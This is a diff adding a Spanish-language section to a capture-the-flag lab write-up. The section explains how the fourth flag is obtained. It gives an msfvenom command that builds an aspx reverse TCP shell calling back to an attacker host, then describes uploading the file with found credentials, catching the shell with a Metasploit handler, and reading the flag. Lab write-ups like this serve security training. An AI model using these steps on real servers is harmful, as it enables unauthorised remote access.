@@ -97,4 +97,20 @@ Durante la resolución de la tercera flag, comprobamos gracias a los archivos y 
 
 Para ello creamos un payload `aspx` con msfvenom.
 
+```console
+root@ine# msfvenom -a x64 -p windows/x64/shell/reverse_tcp LHOST=10.10.37.3 LPORT=4444 -f aspx -o shell.aspx
+```
 
+![payload](img/payload.png)
+
+Una vez generado, usamos el usuario obtenido en la pista para subir el payload al servidor.
+
+![put](img/put.png)
+
+Creamos un listener usando `multi/handler` en metasploit y ejecutamos el payload desde el navegador accediendo a `target.ine.local/shell.aspx`.
+
+![handler](img/handler.png)
+
+Por último, buscamos la flag en el directorio raiz.
+
+![flag4](img/flag4.png)
